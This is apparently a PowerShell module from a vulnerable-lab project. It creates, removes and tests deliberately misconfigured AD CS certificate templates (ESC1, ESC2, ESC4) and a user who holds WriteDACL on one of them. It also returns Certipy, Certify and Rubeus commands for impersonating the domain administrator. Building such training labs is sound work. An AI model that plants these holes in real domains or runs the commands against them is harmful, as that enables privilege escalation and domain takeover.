#Requires -Modules ActiveDirectory

<#
.SYNOPSIS
    Deploys, removes, and tests AD CS (Active Directory Certificate Services) abuse scenarios.

.DESCRIPTION
    This module creates vulnerable certificate templates that enable AD CS privilege escalation
    attacks (MITRE ATT&CK T1649). It implements three classic ESC (Escalation) scenarios:

    - ESC1: A template allowing enrollee-supplied subject alternative names with Client
      Authentication EKU, permitting any domain user to request a certificate as any other user.
    - ESC2: A template with the Any Purpose EKU, making issued certificates valid for all uses.
    - ESC4: A template where a low-privileged user has WriteDACL on the template object itself,
      enabling the attacker to modify the template to become ESC1-vulnerable.

    This module performs AD CS availability detection and degrades gracefully when the Certificate
    Authority role is not installed, creating what it can and warning about what it cannot.

.NOTES
    Module:     VulnAD - AD CS Abuse
    Author:     VulnAD Project
    Requires:   ActiveDirectory module, VulnAD-Core.ps1 helpers
    MITRE ID:   T1649
#>

# ── Private Helper: Check AD CS Availability ──────────────────────────────────
function Test-ADCSAvailability {
    <#
    .SYNOPSIS
        Checks whether AD CS infrastructure is available in the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$DomainDN
    )

    # Method 1: Check for CertSvc service on the local machine
    try {
        $certSvc = Get-Service -Name 'CertSvc' -ErrorAction Stop
        if ($certSvc.Status -eq 'Running') {
            return @{ Available = $true; Method = 'CertSvc service is running locally' }
        }
    }
    catch {
        # Service not found locally - not necessarily an error
    }

    # Method 2: Check for Certification Authorities container in AD configuration
    try {
        $caContainerDN = "CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,$DomainDN"
        $caContainer = [ADSI]"LDAP://$caContainerDN"
        if ($caContainer.Children) {
            $caNames = @()
            foreach ($child in $caContainer.Children) {
                $caNames += $child.Name
            }
            if ($caNames.Count -gt 0) {
                return @{ Available = $true; Method = "Found CA(s) in AD: $($caNames -join ', ')" }
            }
        }
    }
    catch {
        # Container not accessible
    }

    # Method 3: Check for any Enrollment Services
    try {
        $enrollDN = "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$DomainDN"
        $enrollContainer = [ADSI]"LDAP://$enrollDN"
        if ($enrollContainer.Children) {
            return @{ Available = $true; Method = 'Enrollment Services found in AD configuration' }
        }
    }
    catch {
        # Not accessible
    }

    return @{ Available = $false; Method = 'No AD CS infrastructure detected' }
}

function Deploy-ADCS {
    <#
    .SYNOPSIS
        Deploys vulnerable AD CS certificate templates for ESC1, ESC2, and ESC4 scenarios.

    .DESCRIPTION
        Checks for AD CS availability, then creates vulnerable certificate templates by
        cloning existing templates via ADSI. Also creates a low-privileged user (v.kumar)
        for the ESC4 scenario. Degrades gracefully if AD CS is not installed.

    .PARAMETER Difficulty
        Attack difficulty level: Easy, Medium, or Hard.

    .PARAMETER DomainDN
        Distinguished name of the domain (e.g., DC=contoso,DC=com).

    .PARAMETER Domain
        FQDN of the domain (e.g., contoso.com).

    .EXAMPLE
        Deploy-ADCS -Difficulty Medium -DomainDN 'DC=vulnlab,DC=local' -Domain 'vulnlab.local'
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('Easy', 'Medium', 'Hard')]
        [string]$Difficulty,

        [Parameter(Mandatory)]
        [string]$DomainDN,

        [Parameter(Mandatory)]
        [string]$Domain
    )

    Write-VulnStatus -Message "Deploying AD CS Abuse scenario ($Difficulty difficulty)" -Type Info

    $createdObjects = [System.Collections.Generic.List[string]]::new()
    $templateBaseDN = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$DomainDN"
    $adcsWarnings   = [System.Collections.Generic.List[string]]::new()

    # ── Pre-flight: Check AD CS Availability ──────────────────────────────────
    $adcsStatus = Test-ADCSAvailability -DomainDN $DomainDN

    if (-not $adcsStatus.Available) {
        $warningMsg = @(
            'AD CS (Certificate Authority) is NOT installed or not detected in this domain.',
            'Certificate template objects will be created in AD configuration, but they will',
            'not be enrollable until a CA is installed and the templates are published.',
            "Detection result: $($adcsStatus.Method)"
        ) -join ' '
        Write-VulnStatus -Message $warningMsg -Type Warning
        $adcsWarnings.Add($warningMsg)
    }
    else {
        Write-VulnStatus -Message "AD CS detected: $($adcsStatus.Method)" -Type Info
    }

    # ── Step 1: Create v.kumar for ESC4 Scenario ─────────────────────────────
    try {
        $password = Get-VulnPassword -Difficulty $Difficulty -Index 7

        $vkUser = New-VulnUser -SamAccountName 'v.kumar' `
                               -Name 'Vijay Kumar' `
                               -Password $password `
                               -DomainDN $DomainDN `
                               -Description 'Developer - Has WriteDACL on ESC4 template'

        if ($vkUser) {
            $createdObjects.Add('User: v.kumar (ESC4 attacker)')
            Write-VulnResult -Name 'v.kumar' -Detail 'User created for ESC4 scenario' -Success $true
        }
    }
    catch {
        Write-VulnResult -Name 'v.kumar' -Detail "Failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "Error creating v.kumar: $($_.Exception.Message)" -Type Error
    }

    # ── Step 2: Create ESC1 Template ──────────────────────────────────────────
    # ESC1: Enrollee supplies subject + Client Auth EKU + Domain Users can enroll
    try {
        $esc1TemplateName = 'VulnAD-ESC1-ClientAuth'
        $esc1TemplateDN   = "CN=$esc1TemplateName,$templateBaseDN"

        # Connect to the Certificate Templates container via ADSI
        $templateContainer = [ADSI]"LDAP://$templateBaseDN"

        # Create the template object
        $esc1Template = $templateContainer.Create('pKICertificateTemplate', "CN=$esc1TemplateName")

        # Basic template properties
        $esc1Template.Put('displayName', 'VulnAD ESC1 - Client Authentication')
        $esc1Template.Put('flags', [int]131680)             # CT_FLAG_AUTO_ENROLLMENT | CT_FLAG_PUBLISH_TO_DS
        $esc1Template.Put('revision', [int]100)
        $esc1Template.Put('pKIDefaultKeySpec', [int]1)      # AT_KEYEXCHANGE

        # CRITICAL: Allow enrollee to supply Subject (ENROLLEE_SUPPLIES_SUBJECT flag)
        # msPKI-Certificate-Name-Flag = 1 means ENROLLEE_SUPPLIES_SUBJECT
        $esc1Template.Put('msPKI-Certificate-Name-Flag', [int]1)

        # Certificate validity and renewal period (encoded as byte arrays)
        # 1 year validity
        $esc1Template.Put('pKIMaxIssuingDepth', [int]0)
        $esc1Template.Put('pKIExpirationPeriod', [byte[]](0x00, 0x80, 0x14, 0xC4, 0xFE, 0xFF, 0xFF, 0xFF))
        $esc1Template.Put('pKIOverlapPeriod',    [byte[]](0x00, 0x80, 0xA6, 0x0A, 0xFF, 0xFF, 0xFF, 0xFF))

        # EKU: Client Authentication (1.3.6.1.5.5.7.3.2)
        $esc1Template.Put('pKIExtendedKeyUsage', @('1.3.6.1.5.5.7.3.2'))

        # Enrollment flags: no manager approval required
        $esc1Template.Put('msPKI-Enrollment-Flag', [int]0)

        # Private key flags
        $esc1Template.Put('msPKI-Private-Key-Flag', [int]16842752)

        # Minimum key size
        $esc1Template.Put('msPKI-Minimal-Key-Size', [int]2048)

        $esc1Template.SetInfo()

        # Grant Domain Users enrollment rights
        $domainUsersSID = New-Object System.Security.Principal.SecurityIdentifier(
            (Get-ADGroup -Identity 'Domain Users').SID
        )
        $enrollGUID = [Guid]'0e10c968-78fb-11d2-90d4-00c04f79dc55'  # Certificate-Enrollment
        $enrollACE  = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $domainUsersSID,
            [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
            [System.Security.AccessControl.AccessControlType]::Allow,
            $enrollGUID
        )
        $esc1Template.ObjectSecurity.AddAccessRule($enrollACE)
        $esc1Template.CommitChanges()

        $createdObjects.Add("Template: $esc1TemplateName (ESC1 - Enrollee Supplies Subject + Client Auth)")
        Write-VulnResult -Name $esc1TemplateName -Detail 'ESC1 template created (enrollee-supplied subject, Client Auth EKU)' -Success $true
    }
    catch {
        Write-VulnResult -Name 'VulnAD-ESC1-ClientAuth' -Detail "Failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "Error creating ESC1 template: $($_.Exception.Message)" -Type Error
        $adcsWarnings.Add("ESC1 template creation failed: $($_.Exception.Message)")
    }

    # ── Step 3: Create ESC2 Template ──────────────────────────────────────────
    # ESC2: Any Purpose EKU (OID: 2.5.29.37.0)
    try {
        $esc2TemplateName = 'VulnAD-ESC2-AnyPurpose'
        $esc2TemplateDN   = "CN=$esc2TemplateName,$templateBaseDN"

        $esc2Template = $templateContainer.Create('pKICertificateTemplate', "CN=$esc2TemplateName")

        $esc2Template.Put('displayName', 'VulnAD ESC2 - Any Purpose')
        $esc2Template.Put('flags', [int]131680)
        $esc2Template.Put('revision', [int]100)
        $esc2Template.Put('pKIDefaultKeySpec', [int]1)

        # Standard subject naming (from AD)
        $esc2Template.Put('msPKI-Certificate-Name-Flag', [int]0x18000000)  # Subject from AD

        # Validity periods
        $esc2Template.Put('pKIMaxIssuingDepth', [int]0)
        $esc2Template.Put('pKIExpirationPeriod', [byte[]](0x00, 0x80, 0x14, 0xC4, 0xFE, 0xFF, 0xFF, 0xFF))
        $esc2Template.Put('pKIOverlapPeriod',    [byte[]](0x00, 0x80, 0xA6, 0x0A, 0xFF, 0xFF, 0xFF, 0xFF))

        # EKU: Any Purpose (2.5.29.37.0) - this is the ESC2 vulnerability
        $esc2Template.Put('pKIExtendedKeyUsage', @('2.5.29.37.0'))

        $esc2Template.Put('msPKI-Enrollment-Flag', [int]0)
        $esc2Template.Put('msPKI-Private-Key-Flag', [int]16842752)
        $esc2Template.Put('msPKI-Minimal-Key-Size', [int]2048)

        $esc2Template.SetInfo()

        # Grant Domain Users enrollment rights
        $enrollACE2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $domainUsersSID,
            [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
            [System.Security.AccessControl.AccessControlType]::Allow,
            $enrollGUID
        )
        $esc2Template.ObjectSecurity.AddAccessRule($enrollACE2)
        $esc2Template.CommitChanges()

        $createdObjects.Add("Template: $esc2TemplateName (ESC2 - Any Purpose EKU)")
        Write-VulnResult -Name $esc2TemplateName -Detail 'ESC2 template created (Any Purpose EKU)' -Success $true
    }
    catch {
        Write-VulnResult -Name 'VulnAD-ESC2-AnyPurpose' -Detail "Failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "Error creating ESC2 template: $($_.Exception.Message)" -Type Error
        $adcsWarnings.Add("ESC2 template creation failed: $($_.Exception.Message)")
    }

    # ── Step 4: Create ESC4 Template ──────────────────────────────────────────
    # ESC4: Low-priv user has WriteDACL on the template object
    try {
        $esc4TemplateName = 'VulnAD-ESC4-WriteDACL'
        $esc4TemplateDN   = "CN=$esc4TemplateName,$templateBaseDN"

        $esc4Template = $templateContainer.Create('pKICertificateTemplate', "CN=$esc4TemplateName")

        $esc4Template.Put('displayName', 'VulnAD ESC4 - Misconfigured Permissions')
        $esc4Template.Put('flags', [int]131680)
        $esc4Template.Put('revision', [int]100)
        $esc4Template.Put('pKIDefaultKeySpec', [int]1)

        # Standard subject naming (safe by default - the vuln is in the DACL)
        $esc4Template.Put('msPKI-Certificate-Name-Flag', [int]0x18000000)

        # Validity periods
        $esc4Template.Put('pKIMaxIssuingDepth', [int]0)
        $esc4Template.Put('pKIExpirationPeriod', [byte[]](0x00, 0x80, 0x14, 0xC4, 0xFE, 0xFF, 0xFF, 0xFF))
        $esc4Template.Put('pKIOverlapPeriod',    [byte[]](0x00, 0x80, 0xA6, 0x0A, 0xFF, 0xFF, 0xFF, 0xFF))

        # Normal EKU: Client Authentication only
        $esc4Template.Put('pKIExtendedKeyUsage', @('1.3.6.1.5.5.7.3.2'))

        $esc4Template.Put('msPKI-Enrollment-Flag', [int]0)
        $esc4Template.Put('msPKI-Private-Key-Flag', [int]16842752)
        $esc4Template.Put('msPKI-Minimal-Key-Size', [int]2048)

        $esc4Template.SetInfo()

        # CRITICAL: Grant v.kumar WriteDACL on this template (ESC4 vulnerability)
        $vkumarSID = New-Object System.Security.Principal.SecurityIdentifier(
            (Get-ADUser -Identity 'v.kumar').SID
        )
        $writeDaclACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $vkumarSID,
            [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl,
            [System.Security.AccessControl.AccessControlType]::Allow
        )
        $esc4Template.ObjectSecurity.AddAccessRule($writeDaclACE)
        $esc4Template.CommitChanges()

        $createdObjects.Add("Template: $esc4TemplateName (ESC4 - v.kumar has WriteDACL)")
        Write-VulnResult -Name $esc4TemplateName -Detail 'ESC4 template created (v.kumar has WriteDACL)' -Success $true
    }
    catch {
        Write-VulnResult -Name 'VulnAD-ESC4-WriteDACL' -Detail "Failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "Error creating ESC4 template: $($_.Exception.Message)" -Type Error
        $adcsWarnings.Add("ESC4 template creation failed: $($_.Exception.Message)")
    }

    # ── Summary ───────────────────────────────────────────────────────────────
    $summaryDetail = "Deployed $($createdObjects.Count) objects"
    if ($adcsWarnings.Count -gt 0) {
        $summaryDetail += " ($($adcsWarnings.Count) warning(s))"
    }
    Write-VulnResult -Name 'AD CS Abuse' -Detail $summaryDetail -Success ($createdObjects.Count -gt 0) -IsLast

    return @{
        Scenario       = 'AD CS Abuse (ESC1/ESC2/ESC4)'
        Description    = @(
            'This scenario creates three vulnerable certificate templates that enable AD CS',
            'privilege escalation. ESC1 allows enrollees to specify any Subject Alternative Name',
            'with Client Auth EKU, enabling authentication as any domain user including Domain Admin.',
            'ESC2 uses the Any Purpose EKU which makes certificates valid for all uses including',
            'client authentication. ESC4 grants WriteDACL to a low-privileged user on a template',
            'object, allowing them to modify it into an ESC1-vulnerable template.',
            if (-not $adcsStatus.Available) {
                'WARNING: AD CS was not detected. Templates were created in AD but cannot be used until a CA is installed.'
            }
        ) -join ' '
        CreatedObjects = $createdObjects.ToArray()
        AttackCommands = @(
            "# ── Enumeration ──",
            "# Certipy - Comprehensive AD CS enumeration",
            "certipy find -u <user>@$Domain -p <password> -dc-ip <DC_IP> -vulnerable -stdout",
            "",
            "# Certify.exe - From domain-joined host",
            "Certify.exe find /vulnerable",
            "Certify.exe find /enrolleeSuppliesSubject",
            "",
            "# ── ESC1: Enrollee Supplies Subject ──",
            "# Request certificate as Domain Admin",
            "certipy req -u <user>@$Domain -p <password> -ca '<CA_NAME>' -template 'VulnAD-ESC1-ClientAuth' -upn 'administrator@$Domain' -dc-ip <DC_IP>",
            "Certify.exe request /ca:<CA_NAME> /template:VulnAD-ESC1-ClientAuth /altname:administrator",
            "",
            "# Authenticate with the certificate",
            "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
            "Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt",
            "",
            "# ── ESC2: Any Purpose EKU ──",
            "certipy req -u <user>@$Domain -p <password> -ca '<CA_NAME>' -template 'VulnAD-ESC2-AnyPurpose' -dc-ip <DC_IP>",
            "",
            "# ── ESC4: WriteDACL on Template ──",
            "# Modify the template to enable ESC1 (add enrollee-supplied subject)",
            "certipy template -u v.kumar@$Domain -p <password> -template 'VulnAD-ESC4-WriteDACL' -save-old -dc-ip <DC_IP>",
            "# Then exploit as ESC1",
            "certipy req -u v.kumar@$Domain -p <password> -ca '<CA_NAME>' -template 'VulnAD-ESC4-WriteDACL' -upn 'administrator@$Domain' -dc-ip <DC_IP>"
        )
        AttackPath     = @(
            "ESC1: Domain User -> Enroll with SAN=Administrator -> Auth as DA",
            "ESC2: Domain User -> Enroll Any Purpose cert -> Use for Client Auth -> Impersonate",
            "ESC4: v.kumar -> WriteDACL on template -> Modify to ESC1 -> Enroll as DA"
        ) -join "`n"
        MitreID        = 'T1649'
        Difficulty     = $Difficulty
    }
}

function Remove-ADCS {
    <#
    .SYNOPSIS
        Removes all AD CS abuse scenario objects from Active Directory.

    .DESCRIPTION
        Deletes the vulnerable certificate templates and the v.kumar user account.
        Handles cases where templates or objects may not exist.

    .PARAMETER DomainDN
        Distinguished name of the domain for locating certificate templates.
    #>
    [CmdletBinding()]
    param(
        [Parameter()]
        [string]$DomainDN
    )

    Write-VulnStatus -Message 'Removing AD CS Abuse scenario objects' -Type Info

    # If DomainDN not provided, try to discover it
    if (-not $DomainDN) {
        try {
            $DomainDN = (Get-ADDomain).DistinguishedName
        }
        catch {
            Write-VulnStatus -Message "Cannot determine DomainDN: $($_.Exception.Message)" -Type Error
            return
        }
    }

    $templateBaseDN = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$DomainDN"

    # Remove certificate templates
    $templateNames = @('VulnAD-ESC1-ClientAuth', 'VulnAD-ESC2-AnyPurpose', 'VulnAD-ESC4-WriteDACL')
    foreach ($templateName in $templateNames) {
        try {
            $templateDN = "CN=$templateName,$templateBaseDN"
            $templateObj = [ADSI]"LDAP://$templateDN"

            if ($templateObj.Path) {
                $templateObj.DeleteTree()
                Write-VulnResult -Name $templateName -Detail 'Template removed' -Success $true
            }
            else {
                Write-VulnResult -Name $templateName -Detail 'Template not found (already removed)' -Success $true
            }
        }
        catch {
            # Check if the error is because the object doesn't exist
            if ($_.Exception.Message -match 'no such object|does not exist|cannot find') {
                Write-VulnResult -Name $templateName -Detail 'Template not found (already removed)' -Success $true
            }
            else {
                Write-VulnResult -Name $templateName -Detail "Removal failed: $($_.Exception.Message)" -Success $false
                Write-VulnStatus -Message "Error removing $($templateName): $($_.Exception.Message)" -Type Error
            }
        }
    }

    # Remove v.kumar user
    try {
        $adUser = Get-ADUser -Identity 'v.kumar' -ErrorAction Stop
        Remove-ADUser -Identity $adUser -Confirm:$false
        Write-VulnResult -Name 'v.kumar' -Detail 'Removed successfully' -Success $true -IsLast
    }
    catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
        Write-VulnResult -Name 'v.kumar' -Detail 'Not found (already removed)' -Success $true -IsLast
    }
    catch {
        Write-VulnResult -Name 'v.kumar' -Detail "Removal failed: $($_.Exception.Message)" -Success $false -IsLast
        Write-VulnStatus -Message "Error removing v.kumar: $($_.Exception.Message)" -Type Error
    }
}

function Test-ADCS {
    <#
    .SYNOPSIS
        Validates that the AD CS abuse scenario is correctly deployed.

    .DESCRIPTION
        Checks that certificate templates exist with correct properties and that v.kumar
        has WriteDACL on the ESC4 template.

    .PARAMETER DomainDN
        Distinguished name of the domain.

    .PARAMETER Domain
        FQDN of the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$DomainDN,

        [Parameter()]
        [string]$Domain
    )

    Write-VulnStatus -Message 'Testing AD CS Abuse scenario deployment' -Type Info

    $templateBaseDN = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$DomainDN"
    $allPassed = $true

    # Test v.kumar user exists
    try {
        Get-ADUser -Identity 'v.kumar' -ErrorAction Stop | Out-Null
        Write-VulnResult -Name 'v.kumar' -Detail 'User exists' -Success $true
    }
    catch {
        Write-VulnResult -Name 'v.kumar' -Detail 'User NOT found' -Success $false
        $allPassed = $false
    }

    # Test ESC1 template
    try {
        $esc1DN = "CN=VulnAD-ESC1-ClientAuth,$templateBaseDN"
        $esc1Obj = [ADSI]"LDAP://$esc1DN"
        if ($esc1Obj.Path) {
            $nameFlag = $esc1Obj.'msPKI-Certificate-Name-Flag'
            $hasEnrollee = ($nameFlag -band 1) -eq 1
            if ($hasEnrollee) {
                Write-VulnResult -Name 'VulnAD-ESC1-ClientAuth' -Detail 'Template exists, enrollee-supplied subject ENABLED' -Success $true
            }
            else {
                Write-VulnResult -Name 'VulnAD-ESC1-ClientAuth' -Detail 'Template exists but enrollee-supplied subject NOT enabled' -Success $false
                $allPassed = $false
            }
        }
        else {
            Write-VulnResult -Name 'VulnAD-ESC1-ClientAuth' -Detail 'Template NOT found' -Success $false
            $allPassed = $false
        }
    }
    catch {
        Write-VulnResult -Name 'VulnAD-ESC1-ClientAuth' -Detail "Check failed: $($_.Exception.Message)" -Success $false
        $allPassed = $false
    }

    # Test ESC2 template
    try {
        $esc2DN = "CN=VulnAD-ESC2-AnyPurpose,$templateBaseDN"
        $esc2Obj = [ADSI]"LDAP://$esc2DN"
        if ($esc2Obj.Path) {
            $ekus = $esc2Obj.pKIExtendedKeyUsage
            $hasAnyPurpose = $ekus -contains '2.5.29.37.0'
            if ($hasAnyPurpose) {
                Write-VulnResult -Name 'VulnAD-ESC2-AnyPurpose' -Detail 'Template exists, Any Purpose EKU set' -Success $true
            }
            else {
                Write-VulnResult -Name 'VulnAD-ESC2-AnyPurpose' -Detail 'Template exists but Any Purpose EKU NOT set' -Success $false
                $allPassed = $false
            }
        }
        else {
            Write-VulnResult -Name 'VulnAD-ESC2-AnyPurpose' -Detail 'Template NOT found' -Success $false
            $allPassed = $false
        }
    }
    catch {
        Write-VulnResult -Name 'VulnAD-ESC2-AnyPurpose' -Detail "Check failed: $($_.Exception.Message)" -Success $false
        $allPassed = $false
    }

    # Test ESC4 template
    try {
        $esc4DN = "CN=VulnAD-ESC4-WriteDACL,$templateBaseDN"
        $esc4Obj = [ADSI]"LDAP://$esc4DN"
        if ($esc4Obj.Path) {
            Write-VulnResult -Name 'VulnAD-ESC4-WriteDACL' -Detail 'Template exists (verify v.kumar WriteDACL manually)' -Success $true
        }
        else {
            Write-VulnResult -Name 'VulnAD-ESC4-WriteDACL' -Detail 'Template NOT found' -Success $false
            $allPassed = $false
        }
    }
    catch {
        Write-VulnResult -Name 'VulnAD-ESC4-WriteDACL' -Detail "Check failed: $($_.Exception.Message)" -Success $false
        $allPassed = $false
    }

    # AD CS availability check
    $adcsStatus = Test-ADCSAvailability -DomainDN $DomainDN
    if ($adcsStatus.Available) {
        Write-VulnResult -Name 'AD CS Infrastructure' -Detail "Available: $($adcsStatus.Method)" -Success $true
    }
    else {
        Write-VulnResult -Name 'AD CS Infrastructure' -Detail 'NOT available - templates exist but are not enrollable' -Success $false
        $allPassed = $false
    }

    Write-VulnResult -Name 'AD CS Abuse' `
                     -Detail $(if ($allPassed) { 'All checks passed' } else { 'Some checks FAILED' }) `
                     -Success $allPassed -IsLast

    return $allPassed
}

Export-ModuleMember -Function Deploy-ADCS, Remove-ADCS, Test-ADCS
